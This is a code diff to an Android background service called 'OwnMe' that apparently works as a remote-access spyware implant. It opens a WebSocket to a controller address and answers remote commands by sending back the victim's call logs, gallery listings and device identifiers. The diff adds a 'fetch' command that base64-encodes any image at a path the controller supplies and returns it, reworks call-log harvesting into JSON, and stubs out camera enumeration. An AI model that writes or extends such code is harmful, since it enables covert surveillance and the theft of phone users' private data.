@@ -10,6 +10,9 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.hardware.camera2.CameraManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
@@ -19,9 +22,11 @@ import android.os.IBinder;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.support.annotation.Nullable;
 import android.support.v4.app.ActivityCompat;
 import android.telephony.TelephonyManager;
+import android.util.Base64;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -31,6 +36,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.ByteArrayOutputStream;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
@@ -48,6 +54,8 @@ public class OwnMe extends Service {
     private String username;
     private Timer pingpong;
     private Timer retryHarder;
+    private static final int PERMISSIONS_REQUEST_READ_PHONE_STATE = 999;
+    TelephonyManager telephonyManager=null;
     boolean webopen = false;
     JSONObject ping;
     JSONObject handshake;
@@ -59,6 +67,8 @@ public class OwnMe extends Service {
     }
 
     public void retryLater(){
+        pingpong.cancel();
+        pingpong.purge();
         retryHarder.cancel();
         retryHarder.purge();
         retryHarder=new Timer();
@@ -70,7 +80,7 @@ public class OwnMe extends Service {
                   connectWebSocket();
                 }
             }
-        },new Date(new Date().getTime()+5000),5000);
+        },new Date(new Date().getTime()+5000),100000000*365);
     }
     public String getNetworkState() {
         ConnectivityManager cm =
@@ -94,6 +104,7 @@ public class OwnMe extends Service {
         String network = getNetworkState();
         if (network != null) {
             Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
+            Toast.makeText(this.getBaseContext(), network + " network available", Toast.LENGTH_LONG).show();
             connectWebSocket();
         } else {
             Toast.makeText(this.getBaseContext(), "no network stopping self", Toast.LENGTH_LONG).show();
@@ -108,8 +119,9 @@ public class OwnMe extends Service {
         pingpong = new Timer();
         retryHarder = new Timer();
         username = getString(R.string.user_name);
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        android_id = "355004054484712   ";//telephonyManager.getDeviceId();
+        android_id = Settings.Secure.getString(getBaseContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+
+
         dev_name = Build.MANUFACTURER + " " + Build.MODEL;
         int sdkVersion = android.os.Build.VERSION.SDK_INT; // e.g. sdkVersion := 8;
         ping = new JSONObject();
@@ -142,6 +154,8 @@ public class OwnMe extends Service {
 
 
     private void connectWebSocket() {
+        retryHarder.cancel();
+        retryHarder.purge();
         URI uri;
         try {
             uri = new URI("ws://"+getString(R.string.ip)+":"+getString(R.string.port));
@@ -156,9 +170,12 @@ public class OwnMe extends Service {
                 Log.i("Websocket", "Opened");
                 mWebSocketClient.send(handshake.toString());
                 webopen = true;
+                pingpong.cancel();
+                pingpong.purge();
+                pingpong = new Timer();
                 retryHarder.cancel();
                 retryHarder.purge();
-                pingpong = new Timer(   );
+                retryHarder=new Timer();
                 pingpong.scheduleAtFixedRate(new TimerTask() {
                     @Override
                     public void run() {
@@ -170,7 +187,7 @@ public class OwnMe extends Service {
 
                         }
                     }
-                }, 0, 5000);
+                }, 5000, 5000);
                 //Toast.makeText(getBaseContext(),"Web socket is on",Toast.LENGTH_LONG).show();
             }
 
@@ -196,6 +213,10 @@ public class OwnMe extends Service {
                     }else if (cmd.equals("calllog")) {
                         x.put("response", getCallLogs());
                         x.put("type", "calllog");
+                    }else if (cmd.equals("fetch")) {
+                        x.put("response", getBase64((String) x.get("path")));
+                        Log.d("inside fetch" , "image done");
+                        x.put("type", "fetch");
                     } else if (cmd.equals("gallery")) {
                         ArrayList gal = getGallery();
                         JSONObject y;
@@ -231,6 +252,8 @@ public class OwnMe extends Service {
                 webopen = false;
                 pingpong.cancel();
                 pingpong.purge();
+                retryHarder.cancel();
+                retryHarder.purge();
                 retryLater();
             }
 
@@ -320,6 +343,7 @@ public class OwnMe extends Service {
         int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
         int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
         sb.append("Call Details :");
+        JSONArray ret=new JSONArray();
         while (managedCursor.moveToNext()) {
             String phNumber = managedCursor.getString(number);
             String phname = managedCursor.getString(name);
@@ -328,28 +352,36 @@ public class OwnMe extends Service {
             Date callDayTime = new Date(Long.valueOf(callDate));
             String callDuration = managedCursor.getString(duration);
             String dir = null;
+            JSONObject x = new JSONObject();
             int dircode = Integer.parseInt(callType);
             switch (dircode) {
                 case CallLog.Calls.OUTGOING_TYPE:
-                    dir = "OUTGOING";
+                    dir = "O";
                     break;
 
                 case CallLog.Calls.INCOMING_TYPE:
-                    dir = "INCOMING";
+                    dir = "I";
                     break;
 
                 case CallLog.Calls.MISSED_TYPE:
-                    dir = "MISSED";
+                    dir = "M";
                     break;
             }
-            sb.append("\nName:"+phname  +"\nPhone Number:--- " + phNumber + " \nCall Type:--- "
-                    + dir + " \nCall Date:--- " + callDayTime
-                    + " \nCall duration in sec :--- " + callDuration);
-            sb.append("\n----------------------------------");
+            try {
+                x.put("name",phname);
+                x.put("number",phNumber);
+                x.put("type",dir);
+                x.put("datetime",callDayTime);
+                x.put("duration",callDuration);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+            ret.put(x);
         }
         managedCursor.close();
-        return sb.toString();
+        return ret.toString();
     }
+
     private void updateBattery(){
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = getBaseContext().registerReceiver(null, ifilter);
@@ -406,6 +438,20 @@ public class OwnMe extends Service {
                 num++;
             }
             return ret;
+    }
+
+    private String getBase64(String path){
+        Bitmap bm = BitmapFactory.decodeFile(path);
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
+        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);
+    }
+
+
+    private String getCameraIds(){
+        CameraManager manager = (CameraManager)getSystemService(Context.CAMERA_SERVICE);
+        JSONObject x =new JSONObject();
+        return "";
     }
 
 }
